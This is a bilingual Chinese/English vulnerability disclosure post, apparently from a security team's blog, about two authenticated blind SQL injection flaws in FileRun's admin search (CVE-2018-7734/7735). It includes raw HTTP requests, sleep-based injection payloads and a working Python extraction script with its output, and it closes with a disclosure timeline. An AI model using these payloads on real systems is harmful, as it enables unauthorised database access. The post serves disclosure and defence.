@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="">
+	<meta charset="UTF-8">
+<!-- <link rel="icon" type="image/x-icon" href="/statics/img/favicon.ico"> -->
+<title>
+	
+		FileRun <= 2017.09.25 Blind SQLi -
+	
+	Symbo1
+</title>
+
+<meta name="theme-color" content="#232323">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="Tr3jer_CongRong.">
+<link rel="alternate" type="application/rss+xml" title="Tr3jer_CongRong.'s RSS Feed" href="/rss.xml">
+<link rel="alternate" type="application/atom+xml" title="Tr3jer_CongRong.'s Atom Feed" href="/atom.xml">
+<link rel="stylesheet" type="text/css" href="/statics/css/style.css">
+<link rel="license" type="text/plain" src="/statics/LICENSE">
+
+
+
+	<body>
+		<header>
+	<pre class="ascii name">
+  ____                        _               _ 
+ / ___|   _   _   _ __ ___   | |__     ___   / |
+ \___ \  | | | | | '_ ` _ \  | '_ \   / _ \  | |
+  ___) | | |_| | | | | | | | | |_) | | (_) | | |
+ |____/   \__, | |_| |_| |_| |_.__/   \___/  |_|
+          |___/                                 
+          	Security Team.
+	</pre>
+</header>
+		<nav>
+	<ul>
+		<li><a href="/">Index</a></li>&nbsp;&nbsp;|
+		<li><a href="/acknowledgement">Acknowledgement</a></li>&nbsp;&nbsp;|
+		<li><a href="/archives">Archives</a></li>&nbsp;&nbsp;|
+		<li><a href="/projects">Projects</a></li>&nbsp;&nbsp;|
+		<li><a href="/members">Members</a></li>&nbsp;&nbsp;|
+		<li><a href="/about">About</a></li>
+		<!-- <li><a href="/rss.xml">RSS</a>/<a href="/atom.xml">Atom</a></li> -->
+	</ul>
+</nav>
+
+		<main>
+			<div class="post-content">
+<div id="post">
+  <h1 align="center">FileRun &lt;= 2017.09.25 Blind SQLi</h1>
+<p align="right" class="date">18 Dec 2017 - scanf</p>
+
+<h2 id="0x00-preface">0x00 Preface</h2>
+
+<p>   在内部分享中需要用到私有的云盘服务,一番寻找之后发现FileRun是个不错的应用程序.FileRun允许我们自己搭建云存储，方便我们的照片，视频等文件更好的分享和存储.
+   Sometimes team private file sharing need use file sharing web application.I noticed FileRun is a great application,This application allows us to access our files anywhere through self-hosted secure cloud storage.</p>
+
+<h2 id="0x01-how-to-find-the-vulnerability">0x01 How To Find The Vulnerability</h2>
+
+<p>   需要我们以<code class="highlighter-rouge">superuser</code>登录后台</p>
+
+<p>These vulnerabilitys was found after the authentication. After we logged in as <code class="highlighter-rouge">superuser</code>.</p>
+
+<h3 id="sql1">SQL1</h3>
+
+<p>控制面板——&gt;Admin——&gt;用户——&gt;快速搜索,这样将会发送一个POST请求。</p>
+
+<p>go to control panel——&gt;Admin——&gt;user——&gt;search,will generate a POST request to the server.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /?module=users&amp;section=cpanel&amp;page=list HTTP/1.1
+Host: target.com
+Content-Length: 20
+Origin: http://target.com
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Accept: */*
+Referer: http://target.com/?module=cpanel&amp;_popup_id=popups_1
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: __cfduid=d7455062d8788785c8b64d8dfef5a7f041513411013; language=chinese; FileRunSID=e578cd49697ef564ed0979bde9d67dcf
+Connection: close
+
+limit=50&amp;search=aaaa
+</code></pre></div></div>
+
+<p>我注意到search参数容易受到SQL注入的影响,通过传入aaaa’ 服务器返回了一个500的响应状态:</p>
+
+<p>I notice that the search parameter might be vulnerable to SQL Injection,I injected a single quote after the value (example:aaaa’),examined the server response error:</p>
+
+<p>然后构造了基于sleep函数延时的payload:</p>
+
+<p>Use MySQL’s delay function sleep () to testing.</p>
+
+<p><img src="https://i.loli.net/2018/11/30/5c01504c70061.png" /></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'xor(sleep(5))or'
+</code></pre></div></div>
+
+<p>结果如下</p>
+
+<p><img src="https://i.loli.net/2018/11/30/5c015098123ba.png" /></p>
+
+<p>然后使用Blind SQL注入技术来获取select user()数据验证脚本如下：</p>
+
+<p>Here I create a simple script to extract current select user()query result using Boolean-based technique.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
+<span class="c"># -*- coding:utf-8 -*-</span>
+<span class="c">#__author__ = 'scanf'</span>
+<span class="kn">import</span> <span class="nn">httplib</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="c">#add cookies</span>
+
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/x-www-form-urlencoded'</span><span class="p">,</span>
+           <span class="s">'User-Agent'</span><span class="p">:</span> <span class="s">'Googlebot/2.1 (+http://www.googlebot.com/bot.html)'</span><span class="p">,</span>
+           <span class="s">'Cookie'</span><span class="p">:</span> <span class="s">'__cfduid=d7455062d8788785c8b64d8dfef5a7f041513411013; language=chinese; FileRunSID=e578cd49697ef564ed0979bde9d67dcf'</span><span class="p">,</span>
+           <span class="c">#'Cookie' : 'input you cookie',</span>
+           <span class="p">}</span>
+<span class="n">payloads</span> <span class="o">=</span> <span class="s">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.*'</span>
+<span class="k">print</span> <span class="s">'[</span><span class="si">%</span><span class="s">s] Start to retrive MySQL User:'</span> <span class="o">%</span> <span class="n">time</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s">'</span><span class="si">%</span><span class="s">H:</span><span class="si">%</span><span class="s">M:</span><span class="si">%</span><span class="s">S'</span><span class="p">,</span> <span class="n">time</span><span class="o">.</span><span class="n">localtime</span><span class="p">())</span>
+<span class="n">user</span> <span class="o">=</span> <span class="s">''</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">15</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">payload</span> <span class="ow">in</span> <span class="n">payloads</span><span class="p">:</span>
+            <span class="n">s</span> <span class="o">=</span> <span class="s">"aaaa'xor(if(ascii(mid(user()from(</span><span class="si">%</span><span class="s">s)for(1)))=</span><span class="si">%</span><span class="s">s,1,0))or'"</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+            <span class="n">s</span> <span class="o">=</span> <span class="s">'''limit=50&amp;search='''</span> <span class="o">+</span> <span class="n">s</span>
+            <span class="c">#url = http://target.com/?module=users&amp;section=cpanel&amp;page=list</span>
+            <span class="n">conn</span> <span class="o">=</span> <span class="n">httplib</span><span class="o">.</span><span class="n">HTTPConnection</span><span class="p">(</span><span class="s">'target.com'</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">)</span>
+            <span class="n">conn</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="n">method</span><span class="o">=</span><span class="s">'POST'</span><span class="p">,</span> <span class="n">url</span><span class="o">=</span><span class="s">'/?module=users&amp;section=cpanel&amp;page=list'</span><span class="p">,</span> <span class="n">body</span><span class="o">=</span><span class="n">s</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+            <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+            <span class="n">html_doc</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">getresponse</span><span class="p">()</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+            <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+            <span class="k">print</span> <span class="s">'.'</span><span class="p">,</span>
+            <span class="k">if</span> <span class="n">html_doc</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">'uid'</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="n">user</span> <span class="o">+=</span> <span class="n">payload</span>
+                <span class="k">print</span> <span class="s">'</span><span class="se">\n</span><span class="s">[in progress]'</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span>
+                <span class="k">break</span>
+<span class="k">print</span> <span class="s">'</span><span class="se">\n</span><span class="s">[Done] MySQL user is </span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">user</span>
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[20:39:20] Start to retrive MySQL User:
+. . . . . . 
+[in progress] f . . . . . . . . . 
+[in progress] fi . . . . . . . . . . . . 
+[in progress] fil . . . . . 
+[in progress] file . . . . . . . . . . . . . . . . . . 
+[in progress] filer . . . . . . . . . . . . . . . . . . . . . 
+[in progress] fileru . . . . . . . . . . . . . . 
+[in progress] filerun . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
+[in progress] filerun@ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
+[in progress] filerun@1 . . .
+</code></pre></div></div>
+
+<h3 id="sql2">SQL2</h3>
+
+<p>控制面板——&gt;元数据——&gt;快速搜索,输入字符串后将发起一个POST请求:</p>
+
+<p>control panel——&gt;Metadata——&gt;search Same as SQL1,will generate a POST request to the server:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /?module=metadata&amp;section=cpanel&amp;page=list_filetypes HTTP/1.1
+Host: target.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0
+Accept: */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Referer: http://target.com/?module=cpanel&amp;_popup_id=popups_1
+X-Requested-With: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Length: 36
+Cookie: __cfduid=df5ddd49a2303cb2e13b6aa8ece2af7b11513411363; FileRunSID=fa163cd088b68ae20c689826e3a70479; language=chinese
+Connection: close
+
+limit=50&amp;search=aaa'xor(sleep(2))or'
+</code></pre></div></div>
+
+<p>然后超时后响应:</p>
+
+<p>sleep() function is executed:</p>
+
+<p><img src="https://i.loli.net/2018/11/30/5c0150d5f182e.png" /></p>
+
+<h2 id="timeline">timeline</h2>
+
+<ul>
+  <li>2017.12.18 发现漏洞并联系官方 Discover the vulnerability and contact the official</li>
+  <li>2017.12.22 等待官方处理 Waiting for official processing</li>
+  <li>2018.2.13 官方修复2.13并致谢并允许公开 Officially fixed 2.13 and thanks and open for publication</li>
+  <li>2018.3.6 请求cve漏洞编号 Request cve</li>
+  <li>2018.3.7 获得CVE-2018-7734 CVE-2018-7735</li>
+</ul>
+
+<p>cve information：</p>
+
+<p>http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7734
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7735</p>
+
+</div>
+</div>
+
+<div style="display: none;">
+	<script src="https://s5.cnzz.com/z_stat.php?id=1275488238&web_id=1275488238" language="JavaScript"></script>
+</div>
+		</main>
+		<!-- <footer>
+
+</footer>
+ -->
+		<div style="display: none;">
+        	<script src="https://s5.cnzz.com/z_stat.php?id=1275488238&web_id=1275488238" language="JavaScript"></script>
+    	</div>
+	</body>
+</html>
